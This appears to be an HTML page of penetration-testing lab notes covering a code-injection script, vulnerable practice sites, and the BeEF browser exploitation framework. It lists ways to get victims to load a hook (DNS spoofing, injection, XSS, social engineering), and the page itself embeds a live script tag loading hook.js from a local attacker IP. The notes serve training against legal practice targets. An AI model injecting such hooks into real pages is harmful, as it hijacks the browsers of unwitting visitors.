<h3>CODE INJECTOR</h3>
    <p>
    HTTP only.  
    </p>
<p>
    This script works fully with:  <b>http://testasp.vulnweb.com/</b>
    <br />
    <h4>
        It does work in other sites if you insert the code in an earlier tag.
    </h4>
    <p>eg, </head> tag but may also break page load</p>
    <b>http://www.pentest-standard.org/</b>
    <br />
    Works now against functioning:  <b>http://juice-shop.herokuapp.com/#/</b>
    <br />
    But breaks the site stopping page load.  
    <br />

<h3>Testing Online</h3>
    <p>We are testing HTTP online against OWASP Juice Shop, and/or Vulnweb.
        <br/> 
            Both of these site have been designed and hosted as hackable sites. 
        <br/> 
        Fully legal.
        <br/>
            <b>http://juice-shop.herokuapp.com/#/</b>
        <br />
            <b>http://testasp.vulnweb.com/</b>

<h3>Testing Locally</h3>
    <h4>Separate script code_inj_https.py to deal with localhost testing...</h4>
        <p> Against OWASP Juice Shop:  <b>http://127.0.0.1:42000/#/</b>
        </p>
    <h4>Brief install guide, Juice Shop from the terminal in Kali Linux.</h4>
    <p>
        There is misinformation about how to do this.  
        <br/>
        eg, install Docker, install node, install npm, download from github.  
        <br/>
        Here is the painfree <b>Linux</b> version:
    </p>
    <ol>
        <li>From anywhere on your terminal command line
            <br />
            <b>sudo apt install juice-shop</b>
        </li>
        <li>When install is complete</li>
        <li><b>sudo juice-shop start</b></li>
        <li>Navigate to: <b>http://127.0.0.1:42000/#/</b>
        <li>Take a moment to recognize that Linux ROX!</li>
    </ol>
<h4>Process</h4>
<ol>
    <li>
        Set IP Table rules using set_iptables.py<br/>
        You can figure how to do this, or just set the tables manually.
    </li>
    <li>
        Afterwards, flush the iptables, and check the tables have been flushed.<br/>
        <b>sudo iptables -L</b>
    </li>
    <li>
        No port forwarding required.
    </li>
</ol>
<h3>Client Side Attacks.</h3>
    <h4>Beef Framework.</h4>
        <p>
            <b>Browser</b> Exploitation Framework allowing us to launch a number of attacks
            on a hooked target.
            <br />
            Targets are hooked once they load a hook url.
        </p>
        <ol>
            <li>DNS spoof requests to a page containing the hook</li>
            <li>Inject the hook in browsed pages (need to be onPath)</li>
            <li>Use XSS Exploit</li>
            <li>Social engineer the target to open a hook page.</li>
        </ol>
        <h4>Install BeEF</h4>
        <ol>
            <li>sudo apt update</li>
            <li>sudp apt upgrade</li>
            <li>sudo apt-get install beef-xss</li>
            <li>In apps, navigate to Beef Start BeEF-xss, and click to start </li>
            <li>You will be prompted for a UN and a PW</li>
            <li>Navigate to <b>http://127.0.0.1:3000/ui/panel</b></li>
        </ol>
        <h4>Phishing for BeEF</h4>
        <h5>DNS Spoof, Code Inject or Social Engineer to get JS hook in page</h5>
        <p>First Example, for Kali Linux only</p>
        <ol>
            <li>Go to /var/www/html/ to open index.html</li>
            <li>Make a backup of index.html, deleted all, insert the hook:
                <br/>
                <h4>This HTML file contains the BeEF Hook</h4>
                Get your ip <b>ifconfig</b>
                <br/>
                <b><script src="http://<IP>:3000/hook.js"></script></b>
                <br/>
                <script src="http://192.168.63.139:3000/hook.js"></script>
                <br/>
                That's the only code you need for this example.
            </li>
            <li>Start your websever: $ service apache2 start</li>
            <li>So now, when we load our index.html into the browser of a 
                <br/>
                local or a remote VM on our VN, the beef panel will update
                <br/>
                Check it out, explore the tabs
            </li>
            <li>
                Add the BeEF injection code to our code injector script.
            </li>
            <li>
                Tested works fine against Vulnweb.  After this, BeEF updates.
            </li>
        </ol>
    <h4>Most useful commands</h4>
        <ol>
            <li>
                Click on the target browser to bring up the GUI.
            </li>
                Select the commands tab.
            <li>
                Let's do a simple alert.
                <br/>
                Type alert into the search field.
                <li>
                    Select <b>Create alert dialog</b>
                </li>
                <li>
                    Select Execute
                </li>
            </li>
            <li></li>
            <li>
            </li>
            <li>
                
            </li>
            <li>

            </li>
        </ol>


